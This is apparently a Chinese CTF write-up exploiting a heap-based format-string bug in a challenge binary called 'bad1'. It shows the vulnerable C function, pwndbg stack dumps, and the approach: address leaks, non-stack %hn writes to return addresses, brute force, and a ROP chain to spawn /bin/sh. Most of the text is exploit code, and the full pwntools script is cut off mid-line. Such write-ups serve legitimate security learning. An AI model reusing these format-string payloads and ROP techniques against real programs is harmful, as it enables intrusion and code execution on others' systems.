<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">program</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  doit();</span><br><span class="line">  doit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">doit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">void</span> *chunk; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  chunk = <span class="built_in">malloc</span>(<span class="number">0x3E8</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;try it: &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, chunk, <span class="number">0x3E8</span>uLL);</span><br><span class="line">  <span class="built_in">printf</span>((<span class="keyword">const</span> <span class="keyword">char</span> *)chunk);</span><br><span class="line">  <span class="built_in">free</span>(chunk);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路</strong></p>
<p>有格式化字符串漏洞但是缓冲区在堆中，通过当前寄存器和栈可以泄露 heap_base，libc_base，libc_base，stack_addr：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">*RCX  <span class="number">0x7faea9be9992</span> (read+<span class="number">18</span>) ◂— cmp    rax, <span class="number">-0x1000</span> <span class="comment">/* &#x27;H=&#x27; */</span></span><br><span class="line">*RDX  <span class="number">0x3e8</span></span><br><span class="line">*RDI  <span class="number">0x555eeb6c32a0</span> ◂— <span class="string">&#x27;%3$p\n%1$p\n\n&#x27;</span></span><br><span class="line">*RSI  <span class="number">0x555eeb6c32a0</span> ◂— <span class="string">&#x27;%3$p\n%1$p\n\n&#x27;</span></span><br><span class="line">*R8   <span class="number">0x8</span></span><br><span class="line">*R9   <span class="number">0x555eeb6c32a0</span> ◂— <span class="string">&#x27;%3$p\n%1$p\n\n&#x27;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">&quot;%3$p\n%1$p\n%9$p\n&quot;</span></span><br><span class="line">sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">libc_base = leak_addr - <span class="number">0x114992</span></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">heap_base = leak_addr - <span class="number">0x2a0</span></span><br><span class="line">leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">pro_base  = leak_addr - <span class="number">0x1248</span></span><br><span class="line">success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">one_gadget = libc_base + <span class="number">0xebcf1</span></span><br><span class="line">success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br></pre></td></tr></table></figure>
<p>接着就需要用到非栈上 fmt 的技巧：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7fff32e28280</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0x7fff32e28280</span> —▸ <span class="number">0x7fff32e283c8</span> —▸ <span class="number">0x7fff32e290d6</span> ◂— <span class="number">0x4c00316461622f2e</span> <span class="comment">/* &#x27;./bad1&#x27; */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0x7fff32e28288</span> —▸ <span class="number">0x55b00dcf82a0</span> ◂— <span class="string">&#x27;%10c$13hn\n&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│ rbp <span class="number">0x7fff32e28290</span> —▸ <span class="number">0x7fff32e282a0</span> —▸ <span class="number">0x7fff32e282b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0x7fff32e28298</span> —▸ <span class="number">0x55b00ce2e252</span> ◂— nop    </span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0x7fff32e282a0</span> —▸ <span class="number">0x7fff32e282b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│     <span class="number">0x7fff32e282a8</span> —▸ <span class="number">0x55b00ce2e26d</span> ◂— mov    eax, <span class="number">0</span></span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│     <span class="number">0x7fff32e282b0</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│     <span class="number">0x7fff32e282b8</span> —▸ <span class="number">0x7fb072b0bd90</span> (__libc_start_call_main+<span class="number">128</span>) ◂— mov    edi, eax</span><br><span class="line"><span class="number">08</span>:<span class="number">0040</span>│  <span class="number">0x7fff32e282c0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">09</span>:<span class="number">0048</span>│  <span class="number">0x7fff32e282c8</span> —▸ <span class="number">0x55b00ce2e255</span> ◂— push   rbp</span><br><span class="line"><span class="number">0</span>a:<span class="number">0050</span>│  <span class="number">0x7fff32e282d0</span> ◂— <span class="number">0x100000000</span></span><br><span class="line"><span class="number">0b</span>:<span class="number">0058</span>│  <span class="number">0x7fff32e282d8</span> —▸ <span class="number">0x7fff32e283c8</span> —▸ <span class="number">0x7fff32e290d6</span> ◂— <span class="number">0x4c00316461622f2e</span> <span class="comment">/* &#x27;./bad1&#x27; */</span></span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│  <span class="number">0x7fff32e282e0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│  <span class="number">0x7fff32e282e8</span> ◂— <span class="number">0x1149dda85894f8f3</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│  <span class="number">0x7fff32e282f0</span> —▸ <span class="number">0x7fff32e283c8</span> —▸ <span class="number">0x7fff32e290d6</span> ◂— <span class="number">0x4c00316461622f2e</span> <span class="comment">/* &#x27;./bad1&#x27; */</span></span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│  <span class="number">0x7fff32e282f8</span> —▸ <span class="number">0x55b00ce2e255</span> ◂— push   rbp</span><br><span class="line"><span class="number">10</span>:<span class="number">0080</span>│  <span class="number">0x7fff32e28300</span> —▸ <span class="number">0x55b00ce30dd8</span> —▸ <span class="number">0x55b00ce2e130</span> ◂— endbr64 </span><br><span class="line"><span class="number">11</span>:<span class="number">0088</span>│  <span class="number">0x7fff32e28308</span> —▸ <span class="number">0x7fb072d46040</span> (_rtld_global) —▸ <span class="number">0x7fb072d472e0</span> —▸ <span class="number">0x55b00ce2d000</span> ◂— <span class="number">0x10102464c457f</span></span><br><span class="line"><span class="number">12</span>:<span class="number">0090</span>│  <span class="number">0x7fff32e28310</span> ◂— <span class="number">0xeeb7b86d5d16f8f3</span></span><br><span class="line"><span class="number">13</span>:<span class="number">0098</span>│  <span class="number">0x7fff32e28318</span> ◂— <span class="number">0xee2938c9221ef8f3</span></span><br></pre></td></tr></table></figure>
<p>对于非栈上 fmt 有两个关键点：</p>
<ul>
<li>修改栈指针，使两个栈指针最终指向同一片空间（需要修改的目标）</li>
<li>覆盖返回地址写循环</li>
</ul>
<p>位于 <code>0x7fff32e28290</code> 和 <code>0x7fff32e282a0</code> 这两处地址的空间正好符合条件，在实际利用的过程中遇到了一下问题：</p>
<ul>
<li>被 <code>%n</code> 修改过的栈空间并不能第一时间生效（第二个 <code>%n</code> 不会识别修改后的数据，而是会识别修改前的）</li>
<li>printf 不会调用 buffered_vfprintf 而是直接 jmp 过去（这意味着不能通过覆盖 <code>__vfprintf_internal</code> 的返回地址来实现循环）</li>
</ul>
<p>最后想出的解决办法是：第一次 fmt 使用 1/4096 的概率修改栈指针为函数 <code>doit</code> 的返回地址</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">magic = <span class="number">0xdbe8</span>-<span class="number">0x38</span></span><br><span class="line">payload = <span class="string">&quot;%3$p\n%1$p\n%9$p\n%6$p\n&quot;</span></span><br><span class="line">payload += <span class="string">&quot;%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic)</span><br><span class="line">sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br></pre></td></tr></table></figure>
<p>在后续操作中交替覆盖函数 <code>doit</code> 的返回地址和函数 <code>main</code> 的返回地址，构造出 ROP</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">target</span>):</span></span><br><span class="line">  <span class="keyword">global</span> magic_stack2</span><br><span class="line">  <span class="keyword">if</span>(target &lt; <span class="number">0x10000</span>):</span><br><span class="line">    payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">    sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">    magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    magic_gadget = (target &gt;&gt; <span class="number">16</span>*i)%<span class="number">0x10000</span></span><br><span class="line">    </span><br><span class="line">    success(<span class="string">&quot;magic_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_gadget))</span><br><span class="line">    <span class="keyword">if</span>(magic_stack1 &gt; magic_gadget):</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadget,magic_stack1-<span class="number">1</span>-magic_gadget).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">    y = i+<span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">      magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line">      y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(magic_stack2 &gt; magic_main):</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_main,magic_stack2-<span class="number">1</span>+<span class="number">2</span>*y-magic_main).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      payload = <span class="string">&quot;&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n%&quot;</span>.<span class="built_in">format</span>(magic_stack2,magic_main-<span class="number">1</span>+<span class="number">2</span>*y-magic_stack2).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br></pre></td></tr></table></figure>
<p>还有最后一个问题：由于破坏了栈结构，导致 <code>system(&quot;/bin/sh&quot;)</code> 失效，如果构造 <code>execve(&quot;/bin/sh&quot;,0,0)</code> 则会受到格式化字符串 <code>%n</code> 的限制（写入的数据不能为“0”）</p>
<p>此时我们可以先构造 <code>sys_read(0,stack,size)</code>，然后在栈上输入 ROP（利用 gadget 控制对应寄存器为“0”即可）</p>
<p>在 DEBUG 模式的配合下，勉强写出了可以在 DEBUG 模式中打通的 exp，但正常执行的程序怎么都爆破不出来，后来发现是 DEBUG 模式和正常模式的栈空间不太一样，修正 exp 后理论上可以爆破出 flag（关闭随机化后就可以打出 flag，但 1/4096 的概率太低了）</p>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./bad1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;set debug-file-directory ./.debug/\nb *$rebase(0x1254)\n&quot;</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot; b *$rebase(0x1226)\n&quot;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">  <span class="comment">#debug()</span></span><br><span class="line">  <span class="function"><span class="keyword">def</span> <span class="title">pwn</span>(<span class="params">target</span>):</span></span><br><span class="line">    <span class="keyword">global</span> magic_stack2</span><br><span class="line">    <span class="keyword">if</span>(target &lt; <span class="number">0x10000</span>):</span><br><span class="line">      payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">      sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">      magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">      magic_gadget = (target &gt;&gt; <span class="number">16</span>*i)%<span class="number">0x10000</span></span><br><span class="line">      success(<span class="string">&quot;magic_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(magic_gadget))</span><br><span class="line">      <span class="keyword">if</span>(magic_stack1 &gt; magic_gadget):</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_gadget,magic_stack1-<span class="number">1</span>-magic_gadget).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n&quot;</span>.<span class="built_in">format</span>(magic_stack1,magic_gadget-<span class="number">1</span>-magic_stack1).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">      y = i+<span class="number">1</span></span><br><span class="line">      <span class="keyword">if</span>(i == <span class="number">2</span>):</span><br><span class="line">        magic_stack2 = magic_stack2 + <span class="number">8</span></span><br><span class="line">        y = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span>(magic_stack2 &gt; magic_main):</span><br><span class="line">        payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_main,magic_stack2-<span class="number">1</span>+<span class="number">2</span>*y-magic_main).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line">      <span class="keyword">else</span>:</span><br><span class="line">        payload = <span class="string">&quot;&#123;&#125;c%8$hn\n%&#123;&#125;c%10$hn\n%&quot;</span>.<span class="built_in">format</span>(magic_stack2,magic_main-<span class="number">1</span>+<span class="number">2</span>*y-magic_stack2).ljust(<span class="number">0x60</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">        sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  magic = <span class="number">0xdc08</span>-<span class="number">0x38</span></span><br><span class="line">  payload = <span class="string">&quot;%3$p\n%1$p\n%9$p\n%6$p\n&quot;</span></span><br><span class="line">  payload += <span class="string">&quot;%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic)</span><br><span class="line">  sla(<span class="string">&quot;try it: &quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  libc_base = leak_addr - <span class="number">0x114992</span></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  heap_base = leak_addr - <span class="number">0x2a0</span></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  pro_base  = leak_addr - <span class="number">0x1248</span></span><br><span class="line">  leak_addr = <span class="built_in">eval</span>(p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>])</span><br><span class="line">  stack_addr = leak_addr - <span class="number">0x148</span></span><br><span class="line">  success(<span class="string">&quot;libc_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">  success(<span class="string">&quot;heap_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">  success(<span class="string">&quot;pro_base &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line">  success(<span class="string">&quot;stack_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(stack_addr))</span><br><span class="line"></span><br><span class="line">  io_list_all = libc_base + libc.sym[<span class="string">&quot;_IO_list_all&quot;</span>]</span><br><span class="line">  one_gadget = libc_base + <span class="number">0x50a37</span></span><br><span class="line">  system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">  binsh_addr = libc_base + <span class="number">0x1d8698</span></span><br><span class="line">  pop_rax_ret = libc_base + <span class="number">0x0000000000045eb0</span></span><br><span class="line">  pop_rdi_ret = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">  pop_rsi_ret = libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">  pop_rcx_ret = libc_base + <span class="number">0x000000000008c6bb</span></span><br><span class="line">  pop_rbx_ret = libc_base + <span class="number">0x0000000000035dd1</span></span><br><span class="line">  pop_rdx_r12_ret = libc_base + <span class="number">0x000000000011f497</span></span><br><span class="line">  syscall_ret = libc_base + <span class="number">0x0000000000091396</span></span><br><span class="line">  mov_rdi_rbx_call_rcx = libc_base + <span class="number">0x000000000015e9d8</span></span><br><span class="line">  add_rax_1_ret = libc_base + <span class="number">0x00000000000d83b0</span></span><br><span class="line">  mov_rax_n1_ret = libc_base + <span class="number">0x000000000004244e</span></span><br><span class="line">  mov_rdx_256_ret =libc_base + <span class="number">0x00000000000ecfe7</span></span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;io_list_all &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(io_list_all))</span><br><span class="line">  success(<span class="string">&quot;system &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(system))</span><br><span class="line">  success(<span class="string">&quot;binsh_addr &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(binsh_addr))</span><br><span class="line">  success(<span class="string">&quot;pop_rdi_ret &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(pop_rdi_ret))</span><br><span class="line">  success(<span class="string">&quot;one_gadget &gt;&gt; &quot;</span>+<span class="built_in">hex</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">  magic_stack1 = (stack_addr + <span class="number">0x18</span>)%<span class="number">0x10000</span></span><br><span class="line">  magic_stack2 = (stack_addr + <span class="number">0x38</span>)%<span class="number">0x10000</span></span><br><span class="line">  magic_main = (pro_base + <span class="number">0x123B</span>)%<span class="number">0x10000</span></span><br><span class="line">  magic_one1 = (one_gadget)%<span class="number">0x10000</span></span><br><span class="line">  magic_one2 = (one_gadget &gt;&gt; <span class="number">16</span>)%<span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">  payload = <span class="string">&quot;%&#123;&#125;c%10$hn\n%&#123;&#125;c%8$hn\n&quot;</span>.<span class="built_in">format</span>(magic_main,magic_stack2-<span 